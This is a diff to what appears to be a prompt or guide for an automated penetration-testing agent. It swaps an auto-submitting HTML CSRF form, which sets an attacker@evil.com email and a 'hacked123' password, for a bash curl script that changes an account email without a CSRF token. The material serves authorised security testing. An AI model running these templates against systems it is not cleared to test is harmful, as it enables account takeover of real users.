@@ -223,42 +223,47 @@ fi
 
 ## CSRF (Cross-Site Request Forgery)
 
-For CSRF, use an HTML POC:
+**ALWAYS use bash for CSRF POCs** - demonstrate that the request succeeds without a CSRF token:
 
-\`\`\`html
-<!DOCTYPE html>
-<html>
-<head>
-  <title>POC: CSRF in [Application]</title>
-</head>
-<body>
-  <h1>CSRF Proof of Concept</h1>
+\`\`\`bash
+#!/bin/bash
+# POC: CSRF in [Endpoint]
+# Objective: [Session outcome - demonstrate state change without CSRF token]
 
-  <p><strong>Target:</strong> [TARGET_URL]</p>
-  <p><strong>Action:</strong> [What action is performed]</p>
-  <p><strong>Objective:</strong> [Session outcome]</p>
+TARGET="[TARGET_URL]"
 
-  <!-- Auto-submitting form -->
-  <form id="csrf-form" method="POST" action="[TARGET_URL][ENDPOINT]">
-    <input type="hidden" name="email" value="attacker@evil.com">
-    <input type="hidden" name="password" value="hacked123">
-    <input type="submit" value="Submit">
-  </form>
+# STEP 1: AUTHENTICATION - Get a valid session
+SESSION="[SESSION_COOKIE]"
 
-  <script>
-    document.getElementById('csrf-form').submit();
-  </script>
+# STEP 2: DEMONSTRATE CSRF - Show request succeeds WITHOUT csrf token
+echo "[*] CSRF POC: State-changing request without CSRF token"
+echo "[*] Target: \$TARGET"
+echo ""
 
-  <h2>Instructions</h2>
-  <ol>
-    <li>Log into the target application</li>
-    <li>Open this HTML file in the same browser</li>
-    <li>The form auto-submits, performing the action</li>
-    <li>Verify the state change in the target application</li>
-  </ol>
-</body>
-</html>
+# Make the state-changing request WITHOUT any CSRF token
+response=\$(curl -s -w "\\nHTTP_CODE:%{http_code}" \\
+  -X POST "\$TARGET/change-email" \\
+  -H "Cookie: \$SESSION" \\
+  -H "Content-Type: application/x-www-form-urlencoded" \\
+  -d "email=attacker@evil.com")
+
+HTTP_CODE=\$(echo "\$response" | grep "HTTP_CODE:" | cut -d: -f2)
+BODY=\$(echo "\$response" | grep -v "HTTP_CODE:")
+
+# Verify the request succeeded (state change occurred)
+if [ "\$HTTP_CODE" = "200" ] || [ "\$HTTP_CODE" = "302" ]; then
+  if echo "\$BODY" | grep -qiE "success|updated|changed|saved"; then
+    echo "[+] CSRF CONFIRMED - State change occurred without CSRF token"
+    echo "[+] An attacker could craft an HTML page to exploit this"
+    exit 0
+  fi
+fi
+
+echo "[-] CSRF not confirmed - request may require token"
+exit 1
 \`\`\`
+
+**Note:** HTML POCs are NOT executed or validated. Always use bash to demonstrate the vulnerability works.
 
 ## POC Principles
 
@@ -280,6 +285,7 @@ Every POC must demonstrate:
 
 ## Remember
 
+- **ALWAYS use bash POCs** - HTML POCs are not executed or validated, only bash POCs prove the vulnerability works
 - **POC = codification of your exploit** - document what you actually did
 - **Authenticate first** when testing authenticated endpoints
 - **Show actual impact** - not just HTTP 200 status codes
